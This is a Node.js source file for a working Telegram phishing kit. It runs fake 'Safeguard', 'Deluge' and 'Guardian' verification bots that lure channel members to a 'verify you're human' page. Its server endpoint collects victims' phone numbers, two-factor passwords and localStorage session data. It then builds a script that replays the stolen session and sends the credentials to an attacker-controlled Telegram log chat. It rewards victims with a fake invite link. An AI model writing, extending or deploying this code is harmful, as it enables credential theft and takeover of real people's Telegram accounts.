const express = require("express");
const fs = require("fs");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const { PhoneNumberUtil, PhoneNumberFormat } = require("google-libphonenumber");
require("dotenv").config();

const phoneUtil = PhoneNumberUtil.getInstance();
const PNF = PhoneNumberFormat;

// Admins list (ensure this is populated with valid admin IDs)
const admins = [7085468890];

// Preload images for better performance
const images = {
  success: {
    safeguard: fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg")),
    guardian: fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg")),
  },
  verification: {
    deluge: fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg")),
    guardian: fs.readFileSync(path.join(__dirname, "images/verification/guardian.jpg")),
    safeguard: fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg")),
  },
};

// Initialize bots
const bots = {
  safeguard: new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true }),
  deluge: new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true }),
  guardian: new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true }),
};

// Get bot usernames dynamically
const botUsernames = {};
for (const [key, bot] of Object.entries(bots)) {
  bot.getMe().then((botInfo) => {
    botUsernames[key] = botInfo.username;
    console.log(`${key} Bot Username: ${botInfo.username}`);
  });
}

// Express app setup
const app = express();
app.use(express.json());
app.use(express.static("public"));

// Helper functions
const generateRandomString = (length) => {
  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join("");
};

const formatPhoneNumber = (number) => {
  const parsed = phoneUtil.parse(`+${number}`, "ZZ");
  return phoneUtil.format(parsed, PNF.INTERNATIONAL);
};

// Handle incoming user requests
app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;

    const pass = password || "No Two-factor authentication enabled.";
    const formattedNumber = formatPhoneNumber(phoneNumber);
    const usernameText = usernames
      ? usernames
          .map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`)
          .join("\n")
      : "";

    const script = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    await handleRequest(req, res, {
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      password: pass,
      premium: isPremium,
      script,
      type,
    });
  } catch (error) {
    console.error("Error handling request:", error);
    res.status(500).json({ error: "Server error" });
  }
});

// Main handler for processing user requests
const handleRequest = async (req, res, data) => {
  const bot = bots[data.type];
  if (!bot) return res.status(400).json({ error: "Invalid bot type" });

  const inviteLink = `https://t.me/+${generateRandomString(16)}`;
  const caption = {
    safeguard: `Verified, you can join the group using this temporary link:\n\n${inviteLink}`,
    guardian: `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>${inviteLink}</i>`,
  };

  const image = images.success[data.type];
  const buttons = {
    reply_markup: {
      inline_keyboard: [[{ text: "Join Now", url: inviteLink }]],
    },
  };

  await bot.sendMessage(process.env.LOGS_ID, `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone</b>: <tg-spoiler>${data.number}</tg-spoiler>\n🔐 <b>Password</b>: <code>${data.password}</code>\n<b>Type</b>: ${data.type}`, {
    parse_mode: "HTML",
  });

  await bot.sendPhoto(data.userId, image, {
    caption: caption[data.type],
    ...buttons,
    parse_mode: "HTML",
  });

  res.json({});
};

// Listener for new chat members
const handleNewChatMember = (bot, type) => {
  bot.on("my_chat_member", (update) => {
    const chatId = update.chat.id;
    const { user } = update.new_chat_member;

    if (
      update.chat.type === "channel" &&
      user.is_bot &&
      admins.includes(update.from.id)
    ) {
      bot.sendPhoto(chatId, images.verification[type], {
        caption: `Welcome to ${update.chat.title}, protected by ${type} bot.`,
        reply_markup: {
          inline_keyboard: [[{ text: "Verify", url: `https://t.me/${user.username}?start=scrim` }]],
        },
        parse_mode: "HTML",
      });
    }
  });
};

// Assign chat listeners
for (const [key, bot] of Object.entries(bots)) {
  handleNewChatMember(bot, key);
}

// Bot /start command handler
const handleStart = (bot) => {
  bot.onText(/\/start (.+)/, (msg) => {
    const chatId = msg.chat.id;
    const botUsername = botUsernames[bot];
    const url = `${process.env.DOMAIN}/${botUsername}/?type=${botUsername}`;
    bot.sendPhoto(chatId, images.verification[bot], {
      caption: `Click below to verify you're human:`,
      reply_markup: { inline_keyboard: [[{ text: "Verify", url }]] },
      parse_mode: "HTML",
    });
  });
};

// Start handling bots
Object.values(bots).forEach(handleStart);

// Start Express server
app.listen(process.env.PORT || 80, () => {
  console.log(`Server is running on port ${process.env.PORT || 80}`);
});
